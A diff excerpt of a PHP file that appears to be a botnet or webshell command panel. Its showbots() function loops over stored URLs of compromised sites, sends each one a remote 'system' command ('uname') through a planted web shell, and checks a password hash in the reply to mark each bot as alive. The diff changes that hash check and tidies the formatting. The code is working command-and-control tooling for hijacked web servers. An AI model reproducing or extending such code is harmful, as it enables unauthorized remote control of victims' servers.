@@ -144,18 +144,19 @@ function showbots() {
 	while($row = mysqli_fetch_assoc($data)) {
     
 		$source = conn($row['url'].'?_=system&__=uname');
-		if(strpos($source, md5(666))) {
+		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 			$status = 'OK';
-} else {
-$status = 'BAD';
-}
-if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
-    $statdos = 'OK';
-} else {
-    $statdos = 'BAD';
-}
+		} else {
+			$status = 'BAD';
+		}
+		
+		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
+   			$statdos = 'OK';
+		} else {
+    		$statdos = 'BAD';
+		}
     
-echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td> A'.$status.'</td><td>'.$statdos.'</td></tr>';
+echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td>'.$status.'</td><td>'.$statdos.'</td></tr>';
 }
 echo '</table>';
 
@@ -1932,4 +1933,3 @@ mysqli_close($conn);
 checksql();
 
 ?>
-	
